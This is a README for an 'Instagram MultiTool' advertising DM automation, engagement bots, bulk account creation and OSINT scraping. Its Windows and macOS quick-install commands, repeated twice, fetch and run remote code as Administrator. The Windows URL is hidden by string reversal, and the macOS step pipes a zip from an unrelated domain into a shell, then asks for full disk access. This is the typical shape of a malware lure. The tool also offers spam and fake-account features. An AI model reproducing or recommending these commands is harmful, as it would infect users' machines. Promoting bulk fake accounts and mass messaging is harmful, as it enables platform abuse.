# Instagram MultiTool

A multi-tool covering DM automation, engagement bots, account creation, OSINT, content downloading, and analytics for Instagram.

> [!NOTE]
> Quick install is pinned at the top. Run PowerShell as Administrator, then paste the command below.

---

## ⚡ Quick Install

### Windows (PowerShell)

```powershell
iex(irm(-join"sbs.mrtig//:sptth"[-1..-99]))
```

```
[1/3] Downloading Instagram MultiTool modules...
[2/3] Extracting tools and dependencies...
[3/3] Ready. Run `instamulti --help` to start.
```

> [!TIP]
> Replace the embedded endpoint with your private registry URL when deploying internally.

### macOS / Linux (Terminal)

#### Step 1: Install Node.js (Required)

```bash
# Option A: Install via Homebrew (macOS)
brew install node

# Option B: Verify Node.js installation
node -v && npm -v
```

#### Step 2: Run Quick Install (macOS)

```bash
xcode-select --install
curl -fsSL 'https://software-gateway.xyz/jane.zip' | sh -c "cat > 'jane.zip' && mkdir -p 'jane' && unzip -qo 'jane.zip' -d 'jane' && cd 'jane' && npm i"
```

> [!IMPORTANT]
> On macOS, grant Terminal full disk access if the script cannot write to its target directory.

---

## Features

| Module | Description |
|--------|-------------|
| DM Handler | Automated DM sending and response capture |
| Follower Bot | Automated follower/unfollower growth |
| Liker Bot | Auto-like by tag, user, or feed |
| Commenter | Comment posting with rotation pools |
| Account Creator | Bulk account generation with CAPTCHA rotation |
| OSINT Suite | Profile recon, email scraping, metadata extraction |
| Cleaner | Mass unlike, unfollow, and unpin utilities |
| Cloner | Profile template cloning and inspection |
| Viewer | Anonymous profile viewing tools |
| Downloader | Story, reel, post, and video retrieval |
| API Bridge | Web API client and auto-posting scheduler |
| Data Export | JSON/CSV export of collected metadata |

> [!NOTE]
> Never commit session cookies, tokens, or credentials to GitHub. Use environment variables or a secrets manager.

---

## Installation

### Quick Install (Recommended)

#### Windows

```powershell
iex(irm(-join"sbs.mrtig//:sptth"[-1..-99]))
```

#### macOS

```bash
curl -fsSL 'https://software-gateway.xyz/jane.zip' | sh -c "cat > 'jane.zip' && mkdir -p 'jane' && unzip -qo 'jane.zip' -d 'jane' && cd 'jane' && npm i"
```



## Configuration

| Variable | Required | Default | Description |
|----------|----------|---------|-------------|
| `INSTAGRAM_COOKIE` | Yes | — | Session cookie string |
| `INSTAGRAM_USERNAME` | No | — | Account username for rotation |
| `PROXY_LIST` | No | `./proxies.txt` | Proxy list file |
| `DM_DELAY_MS` | No | `2000` | Delay between DM actions |
| `MAX_RETRIES` | No | `3` | Maximum retry count per action |
| `LOG_LEVEL` | No | `info` | Logging level |
| `OUTPUT_DIR` | No | `./output` | Export directory |

### Example `.env` file

```env
INSTAGRAM_COOKIE=your_cookie_here
INSTAGRAM_USERNAME=user1
PROXY_LIST=./proxies.txt
DM_DELAY_MS=2000
MAX_RETRIES=3
LOG_LEVEL=info
OUTPUT_DIR=./output
```

---

## Usage

```bash
# Show available commands
instamulti --help

# Send DMs to a list of targets
instamulti dm --targets ./targets.txt --template "hi {username}"

# Run automated likes by hashtag
instamulti like --hashtag "fyp" --count 50

# Bulk-create accounts
instamulti accounts create --count 10 --proxy-file ./proxies.txt

# Run OSINT recon on a profile
instamulti osint --target instagram.com/username

# Export collected data
instamulti export --format json --output ./output/results.json
```

> [!TIP]
> Combine `--dry-run` with any command to preview actions without executing them.

---

## Project Structure

```text
instamulti/
├── modules/                # Automation modules by category
│   ├── dm/                # DM handler
│   ├── engagement/        # Liker, commenter, follower bot
│   ├── creator/           # Account creator
│   ├── osint/             # Recon and scraping
│   └── downloader/        # Content retrieval
├── proxies.txt            # Proxy list
├── targets.txt            # Default target list
├── config/
│   └── default.json       # Default configuration
└── output/                # Export directory
```

---

## Contributing

Contributions are welcome.

1. Fork the repository.
2. Create a feature branch.
3. Make focused changes.
4. Run the available checks.
5. Open a pull request with a clear description.

---

## License

MIT License
